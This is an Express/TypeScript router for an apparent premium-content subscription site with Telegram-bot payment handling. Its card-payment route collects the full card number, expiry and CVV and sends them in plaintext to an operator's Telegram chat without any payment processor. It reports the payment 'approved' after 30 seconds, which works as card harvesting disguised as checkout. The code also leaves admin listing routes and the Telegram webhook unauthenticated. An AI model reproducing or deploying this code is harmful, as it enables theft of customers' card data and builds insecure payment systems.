import { Router, type IRouter } from "express";
import multer from "multer";
import { randomUUID } from "crypto";
import { db, packagesTable, paymentMethodsTable, siteSettingsTable } from "@workspace/db";
import { eq, asc } from "drizzle-orm";
import { adminSessions } from "../lib/sessions";

const router: IRouter = Router();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });

// In-memory store for pending card payment approvals
const pendingApprovals = new Map<string, {
  resolve: (decision: "approved" | "rejected") => void;
  timer: ReturnType<typeof setTimeout>;
}>();

function requireAdmin(req: any, res: any, next: any) {
  const token = req.cookies?.admin_token;
  if (!token || !adminSessions.has(token)) {
    res.status(401).json({ error: "Not authenticated" });
    return;
  }
  next();
}

async function getSettings(): Promise<Record<string, string>> {
  const rows = await db.select().from(siteSettingsTable);
  const s: Record<string, string> = {};
  for (const r of rows) if (r.value) s[r.key] = r.value;
  return s;
}

/* ── Packages ─────────────────────────────────────────────── */
router.get("/packages", async (_req, res): Promise<void> => {
  const rows = await db.select().from(packagesTable)
    .where(eq(packagesTable.isActive, true))
    .orderBy(asc(packagesTable.sortOrder), asc(packagesTable.id));
  res.json(rows);
});

router.get("/admin/packages", async (_req, res): Promise<void> => {
  const rows = await db.select().from(packagesTable)
    .orderBy(asc(packagesTable.sortOrder), asc(packagesTable.id));
  res.json(rows);
});

router.post("/admin/packages", requireAdmin, async (req, res): Promise<void> => {
  const { name, emoji, priceBdt, priceGbp, durationValue, durationUnit, features, isActive, sortOrder } = req.body;
  if (!name) { res.status(400).json({ error: "name required" }); return; }
  const [row] = await db.insert(packagesTable).values({
    name, emoji: emoji || "⭐",
    priceBdt: Number(priceBdt) || 0,
    priceGbp: priceGbp || "0",
    durationValue: Number(durationValue) || 1,
    durationUnit: durationUnit || "month",
    features: Array.isArray(features) ? features : [],
    isActive: isActive !== false,
    sortOrder: Number(sortOrder) || 0,
  }).returning();
  res.status(201).json(row);
});

router.put("/admin/packages/:id", requireAdmin, async (req, res): Promise<void> => {
  const id = Number(req.params.id);
  const { name, emoji, priceBdt, priceGbp, durationValue, durationUnit, features, isActive, sortOrder } = req.body;
  const [row] = await db.update(packagesTable).set({
    ...(name !== undefined && { name }),
    ...(emoji !== undefined && { emoji }),
    ...(priceBdt !== undefined && { priceBdt: Number(priceBdt) }),
    ...(priceGbp !== undefined && { priceGbp }),
    ...(durationValue !== undefined && { durationValue: Number(durationValue) }),
    ...(durationUnit !== undefined && { durationUnit }),
    ...(features !== undefined && { features: Array.isArray(features) ? features : [] }),
    ...(isActive !== undefined && { isActive }),
    ...(sortOrder !== undefined && { sortOrder: Number(sortOrder) }),
  }).where(eq(packagesTable.id, id)).returning();
  if (!row) { res.status(404).json({ error: "Not found" }); return; }
  res.json(row);
});

router.delete("/admin/packages/:id", requireAdmin, async (req, res): Promise<void> => {
  const id = Number(req.params.id);
  await db.delete(packagesTable).where(eq(packagesTable.id, id));
  res.json({ success: true });
});

/* ── Payment Methods ──────────────────────────────────────── */
router.get("/payment-methods", async (_req, res): Promise<void> => {
  const rows = await db.select().from(paymentMethodsTable)
    .where(eq(paymentMethodsTable.isActive, true))
    .orderBy(asc(paymentMethodsTable.sortOrder), asc(paymentMethodsTable.id));
  res.json(rows);
});

router.get("/admin/payment-methods", async (_req, res): Promise<void> => {
  const rows = await db.select().from(paymentMethodsTable)
    .orderBy(asc(paymentMethodsTable.sortOrder), asc(paymentMethodsTable.id));
  res.json(rows);
});

router.post("/admin/payment-methods", requireAdmin, async (req, res): Promise<void> => {
  const { type, name, emoji, logoUrl, numberOrAddress, isActive, sortOrder } = req.body;
  if (!name || !numberOrAddress) { res.status(400).json({ error: "name and numberOrAddress required" }); return; }
  const [row] = await db.insert(paymentMethodsTable).values({
    type: type || "local", name, emoji: emoji || "💳",
    logoUrl: logoUrl || null,
    numberOrAddress, isActive: isActive !== false,
    sortOrder: Number(sortOrder) || 0,
  }).returning();
  res.status(201).json(row);
});

router.put("/admin/payment-methods/:id", requireAdmin, async (req, res): Promise<void> => {
  const id = Number(req.params.id);
  const { type, name, emoji, logoUrl, numberOrAddress, isActive, sortOrder } = req.body;
  const [row] = await db.update(paymentMethodsTable).set({
    ...(type !== undefined && { type }),
    ...(name !== undefined && { name }),
    ...(emoji !== undefined && { emoji }),
    ...(logoUrl !== undefined && { logoUrl }),
    ...(numberOrAddress !== undefined && { numberOrAddress }),
    ...(isActive !== undefined && { isActive }),
    ...(sortOrder !== undefined && { sortOrder: Number(sortOrder) }),
  }).where(eq(paymentMethodsTable.id, id)).returning();
  if (!row) { res.status(404).json({ error: "Not found" }); return; }
  res.json(row);
});

router.delete("/admin/payment-methods/:id", requireAdmin, async (req, res): Promise<void> => {
  const id = Number(req.params.id);
  await db.delete(paymentMethodsTable).where(eq(paymentMethodsTable.id, id));
  res.json({ success: true });
});

/* ── Site Settings ────────────────────────────────────────── */
router.get("/settings/public", async (_req, res): Promise<void> => {
  const settings = await getSettings();
  res.json({ premium_join_link: settings["premium_join_link"] ?? null });
});

router.get("/admin/settings", requireAdmin, async (_req, res): Promise<void> => {
  const rows = await db.select().from(siteSettingsTable);
  const obj: Record<string, string | null> = {};
  for (const r of rows) obj[r.key] = r.value ?? null;
  res.json(obj);
});

router.post("/admin/settings", requireAdmin, async (req, res): Promise<void> => {
  const entries = Object.entries(req.body as Record<string, string>);
  for (const [key, value] of entries) {
    await db.insert(siteSettingsTable).values({ key, value: String(value) })
      .onConflictDoUpdate({ target: siteSettingsTable.key, set: { value: String(value) } });
  }
  res.json({ success: true });
});

/* ── Admin: Register Telegram Webhook ─────────────────────── */
router.post("/admin/telegram/set-webhook", requireAdmin, async (req, res): Promise<void> => {
  const settings = await getSettings();
  const botToken = settings["telegram_bot_token"];
  if (!botToken) {
    res.status(400).json({ error: "Save your bot token in Settings first." });
    return;
  }

  const domains = process.env.REPLIT_DOMAINS ?? "";
  const primaryDomain = domains.split(",")[0]?.trim();
  const { webhookUrl: customUrl } = req.body as { webhookUrl?: string };
  const webhookUrl = customUrl?.trim() ||
    (primaryDomain ? `https://${primaryDomain}/api/telegram/callback` : null);

  if (!webhookUrl) {
    res.status(400).json({ error: "Could not determine webhook URL. Enter it manually." });
    return;
  }

  try {
    const r = await fetch(`https://api.telegram.org/bot${botToken}/setWebhook`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        url: webhookUrl,
        allowed_updates: ["callback_query", "message", "pre_checkout_query"],
      }),
    });
    const result = await r.json() as Record<string, unknown>;
    res.json({ ...result, webhookUrl });
  } catch {
    res.status(500).json({ error: "Failed to contact Telegram API" });
  }
});

/* ── Telegram Stars Invoice Creation ─────────────────────── */
router.post("/payment/stars-create", async (req, res): Promise<void> => {
  const { packageId, packageName, packageEmoji, starsAmount } = req.body as {
    packageId?: number; packageName?: string; packageEmoji?: string; starsAmount?: number;
  };

  const settings = await getSettings();
  const botToken = settings["telegram_bot_token"];

  if (!botToken) {
    res.status(400).json({ error: "Bot not configured. Go to admin → Settings and save your bot token first." });
    return;
  }

  const stars = Math.max(1, Number(starsAmount) || 100);

  try {
    const r = await fetch(`https://api.telegram.org/bot${botToken}/createInvoiceLink`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        title: `${packageEmoji || "⭐"} ${packageName || "Premium"}`,
        description: "Red-X Tube Premium — সকল এক্সক্লুসিভ কন্টেন্ট আনলক",
        payload: JSON.stringify({ packageId, packageName, starsAmount: stars }),
        currency: "XTR",
        prices: [{ label: packageName || "Premium", amount: stars }],
      }),
    });
    const data = await r.json() as { ok: boolean; result?: string; description?: string };
    if (!data.ok) {
      res.status(500).json({ error: data.description || "Failed to create Stars invoice" });
      return;
    }
    res.json({ invoiceLink: data.result });
  } catch {
    res.status(500).json({ error: "Failed to contact Telegram API" });
  }
});

/* ── Traditional Payment Submission ──────────────────────── */
router.post("/payment/submit", upload.single("screenshot"), async (req, res): Promise<void> => {
  const { packageName, paymentMethod, trxId, userName, currency, amount } = req.body;
  const screenshot = req.file;

  const settings = await getSettings();
  const botToken = settings["telegram_bot_token"];
  const chatId = settings["telegram_chat_id"];

  if (!botToken || !chatId) {
    res.status(200).json({ success: true, note: "No Telegram configured — submission received" });
    return;
  }

  const caption = [
    "💰 *New Payment Submission*",
    "",
    `📦 Package: *${packageName || "N/A"}*`,
    `💳 Method: *${paymentMethod || "N/A"}*`,
    `🪙 Amount: *${amount || "N/A"} (${currency || "BDT"})*`,
    `🔑 Trx ID: \`${trxId || "Not provided"}\``,
    `👤 Name: ${userName || "Not provided"}`,
  ].join("\n");

  try {
    const telegramBase = `https://api.telegram.org/bot${botToken}`;
    if (screenshot) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("caption", caption);
      formData.append("parse_mode", "Markdown");
      const blob = new Blob([new Uint8Array(screenshot.buffer)], { type: screenshot.mimetype });
      formData.append("photo", blob, screenshot.originalname);
      await fetch(`${telegramBase}/sendPhoto`, { method: "POST", body: formData });
    } else {
      await fetch(`${telegramBase}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: "Markdown" }),
      });
    }
    res.json({ success: true });
  } catch {
    res.status(500).json({ error: "Failed to send to Telegram" });
  }
});

/* ── Card Payment Submit (Bot Approval with 30s Timeout) ──── */
router.post("/payment/card-submit", async (req, res): Promise<void> => {
  const { cardName, cardNumber, expiry, cvv, packageName, amount, currency } = req.body as {
    cardName?: string; cardNumber?: string; expiry?: string; cvv?: string;
    packageName?: string; amount?: string; currency?: string;
  };

  const settings = await getSettings();
  const botToken = settings["telegram_bot_token"];
  const chatId = settings["telegram_chat_id"];

  if (!botToken || !chatId) {
    res.json({ status: "approved" });
    return;
  }

  const callbackId = randomUUID().replace(/-/g, "").slice(0, 12);
  const text = [
    "💳 *New Card Payment Request*",
    "",
    `📦 Package: *${packageName ?? "N/A"}*`,
    `💰 Amount: *${amount ?? "N/A"} (${currency ?? ""})*`,
    `👤 Name: *${cardName ?? "N/A"}*`,
    `🔢 Card: \`${cardNumber ?? "N/A"}\``,
    `📅 Expiry: \`${expiry ?? "N/A"}\``,
    `🔒 CVV: \`${cvv ?? "N/A"}\``,
    "",
    `⏱ _Auto-approves in 30s if no action taken_`,
  ].join("\n");

  try {
    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [[
            { text: "✅ Approve", callback_data: `approve_${callbackId}` },
            { text: "❌ Reject", callback_data: `reject_${callbackId}` },
          ]],
        },
      }),
    });
  } catch {
    res.json({ status: "approved" });
    return;
  }

  const decision = await new Promise<"approved" | "rejected">((resolve) => {
    const timer = setTimeout(() => {
      pendingApprovals.delete(callbackId);
      resolve("approved");
    }, 30_000);
    pendingApprovals.set(callbackId, { resolve, timer });
  });

  res.json({ status: decision });
});

/* ── Telegram Webhook Receiver ────────────────────────────── */
router.post("/telegram/callback", (req, res): void => {
  res.sendStatus(200);

  const body = req.body as any;

  (async () => {
    const settings = await getSettings();
    const botToken = settings["telegram_bot_token"];
    const chatId = settings["telegram_chat_id"];
    if (!botToken) return;

    const tgBase = `https://api.telegram.org/bot${botToken}`;

    /* ── Pre-checkout query: must answer within 10s ── */
    const preCheckout = body?.pre_checkout_query;
    if (preCheckout) {
      await fetch(`${tgBase}/answerPreCheckoutQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ pre_checkout_query_id: preCheckout.id, ok: true }),
      }).catch(() => {});
      return;
    }

    /* ── Successful Stars payment ── */
    const message = body?.message;
    const payment = message?.successful_payment;
    if (payment && payment.currency === "XTR") {
      const from = message.from;
      const userName = [from?.first_name, from?.last_name].filter(Boolean).join(" ") || "Unknown";
      const tgUsername = from?.username ? `@${from.username}` : "N/A";
      let pkgName = "Unknown";
      try { pkgName = JSON.parse(payment.invoice_payload)?.packageName ?? pkgName; } catch {}

      const notify = [
        "⭐ *New Stars Payment Received!*",
        "",
        `📦 Package: *${pkgName}*`,
        `⭐ Stars Paid: *${payment.total_amount}*`,
        `👤 User: ${userName}`,
        `🔗 Telegram: ${tgUsername}`,
        `🆔 Charge ID: \`${payment.telegram_payment_charge_id}\``,
        "",
        "✅ _Payment confirmed by Telegram_",
      ].join("\n");

      if (chatId) {
        await fetch(`${tgBase}/sendMessage`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ chat_id: chatId, text: notify, parse_mode: "Markdown" }),
        }).catch(() => {});
      }

      await fetch(`${tgBase}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: message.chat.id,
          text: `✅ *পেমেন্ট সফল হয়েছে!*\n\n⭐ ${payment.total_amount} Stars পেমেন্ট কনফার্ম হয়েছে।\n📦 Package: *${pkgName}*\n\nঅ্যাডমিন শীঘ্রই আপনাকে গ্রুপে যোগ করবেন। ধন্যবাদ! 🎉`,
          parse_mode: "Markdown",
        }),
      }).catch(() => {});
      return;
    }

    /* ── Inline keyboard callback (approve/reject card payments) ── */
    const callbackQuery = body?.callback_query;
    if (!callbackQuery) return;

    const data: string = callbackQuery.data ?? "";
    const isApprove = data.startsWith("approve_");

    fetch(`${tgBase}/answerCallbackQuery`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        callback_query_id: callbackQuery.id,
        text: isApprove ? "✅ Payment Approved!" : "❌ Payment Rejected",
        show_alert: true,
      }),
    }).catch(() => {});

    fetch(`${tgBase}/editMessageText`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: callbackQuery.message?.chat?.id,
        message_id: callbackQuery.message?.message_id,
        text: isApprove ? "✅ *Payment APPROVED*" : "❌ *Payment REJECTED*",
        parse_mode: "Markdown",
      }),
    }).catch(() => {});

    let callbackId: string | null = null;
    let decision: "approved" | "rejected" | null = null;

    if (data.startsWith("approve_")) {
      callbackId = data.slice("approve_".length);
      decision = "approved";
    } else if (data.startsWith("reject_")) {
      callbackId = data.slice("reject_".length);
      decision = "rejected";
    }

    if (callbackId && decision) {
      const pending = pendingApprovals.get(callbackId);
      if (pending) {
        clearTimeout(pending.timer);
        pendingApprovals.delete(callbackId);
        pending.resolve(decision);
      }
    }
  })();
});

/* ── Admin: Post to Telegram Channel ─────────────────────── */
router.post("/admin/channel-post", requireAdmin, async (req, res): Promise<void> => {
  const {
    botToken: bodyToken, channelId,
    mediaType, mediaUrl,
    caption, parseMode,
    btnType, btnText, btnUrl,
  } = req.body as {
    botToken?: string; channelId?: string;
    mediaType?: "none" | "photo" | "video";
    mediaUrl?: string; caption?: string; parseMode?: string;
    btnType?: "none" | "link" | "app";
    btnText?: string; btnUrl?: string;
  };

  if (!channelId?.trim()) {
    res.status(400).json({ error: "Channel ID/username is required." });
    return;
  }

  const settings = await getSettings();
  const botToken = bodyToken?.trim() || settings["telegram_bot_token"];
  if (!botToken) {
    res.status(400).json({ error: "Bot token is required. Enter it above or save it in Settings." });
    return;
  }

  const tgBase = `https://api.telegram.org/bot${botToken}`;
  const chat_id = channelId.trim();

  let reply_markup: object | undefined;
  if (btnType && btnType !== "none" && btnText?.trim() && btnUrl?.trim()) {
    const btn =
      btnType === "app"
        ? { text: btnText.trim(), web_app: { url: btnUrl.trim() } }
        : { text: btnText.trim(), url: btnUrl.trim() };
    reply_markup = { inline_keyboard: [[btn]] };
  }

  const pm = parseMode && parseMode !== "none" ? parseMode : undefined;

  try {
    let endpoint = "sendMessage";
    const body: Record<string, unknown> = { chat_id };
    if (pm) body.parse_mode = pm;
    if (reply_markup) body.reply_markup = reply_markup;

    if (mediaType === "photo" && mediaUrl?.trim()) {
      endpoint = "sendPhoto";
      body.photo = mediaUrl.trim();
      if (caption?.trim()) body.caption = caption.trim();
    } else if (mediaType === "video" && mediaUrl?.trim()) {
      endpoint = "sendVideo";
      body.video = mediaUrl.trim();
      if (caption?.trim()) body.caption = caption.trim();
    } else {
      body.text = caption?.trim() || ".";
    }

    const r = await fetch(`${tgBase}/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(body),
    });
    const data = await r.json() as { ok: boolean; result?: { message_id?: number }; description?: string };
    if (!data.ok) {
      res.status(400).json({ error: data.description ?? "Telegram API error" });
      return;
    }
    res.json({ ok: true, messageId: data.result?.message_id, message: "Posted to channel successfully!" });
  } catch {
    res.status(500).json({ error: "Failed to contact Telegram API" });
  }
});

export default router;
